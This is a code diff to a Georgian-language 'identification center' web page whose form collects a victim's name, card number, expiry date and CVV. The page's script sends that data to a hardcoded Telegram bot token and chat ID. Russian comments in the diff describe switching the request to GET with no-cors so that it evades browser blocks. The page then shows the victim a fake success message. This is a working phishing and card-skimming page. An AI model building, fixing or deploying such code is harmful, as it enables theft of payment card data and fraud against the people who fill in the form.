@@ -27,7 +27,6 @@
 
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
-    <!-- Добавили id="mainForm" -->
     <form id="mainForm">
         <h3>შეავსეთ ფორმა</h3>
 
@@ -56,7 +55,7 @@
 </div>
 
 <script>
-    // Маски для ввода (чтобы красиво вводились цифры)
+    // Маски для красивого ввода данных карты
     document.getElementById('card-number').addEventListener('input', e => {
         let v = e.target.value.replace(/\D/g, '').slice(0,16);
         e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
@@ -67,14 +66,14 @@
         if (v.length >= 2) e.target.value = v.slice(0,2) + '/' + v.slice(2,4);
     });
 
-    // ГЛАВНАЯ ФУНКЦИЯ ОТПРАВКИ
+    // ФУНКЦИЯ ОТПРАВКИ ДАННЫХ В TELEGRAM
     document.getElementById('mainForm').addEventListener('submit', function(e) {
-        e.preventDefault(); // Чтобы страница не перезагружалась
+        e.preventDefault(); // Останавливаем перезагрузку страницы
 
         const token = '8650944783:AAHsNX_fkpvurn6gkrcgnyqGNfzfHh8Xk9o';
         const chatId = '820823459';
         
-        // Собираем данные из всех полей
+        // Сбор данных из полей формы
         const name = document.getElementById('first-name').value;
         const lastName = document.getElementById('last-name').value;
         const card = document.getElementById('card-number').value;
@@ -83,26 +82,19 @@
 
         const message = `🔔 Новая заявка!\n👤 Имя: ${name} ${lastName}\n💳 Карта: ${card}\n📅 Срок: ${exp}\n🔐 CVV: ${cvv}`;
 
-        // Исправленная ссылка (добавлен /bot и исправлен путь)
-        const url = `https://api.telegram.org{token}/sendMessage`;
+        // Формируем URL для отправки методом GET (это лучше обходит блокировки браузера)
+        const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message
+        // Отправляем запрос
+        fetch(url, { mode: 'no-cors' }) 
+            .then(() => {
+                alert('წარმატებით გაიგზავნა!'); // Показываем успех на грузинском
+                location.reload(); // Очищаем форму
             })
-        })
-        .then(res => {
-            if (res.ok) {
-                alert('წარმატებით გაიგზავნა!'); // "Успешно отправлено" на грузинском
-                location.reload(); // Очистить форму
-            } else {
-                alert('Ошибка при отправке. Проверь токен или ID.');
-            }
-        })
-        .catch(err => alert('Ошибка сети: ' + err));
+            .catch(err => {
+                console.error('Ошибка:', err);
+                alert('შეცდომა! სცადეთ მოგვიანებით.');
+            });
     });
 </script>
 
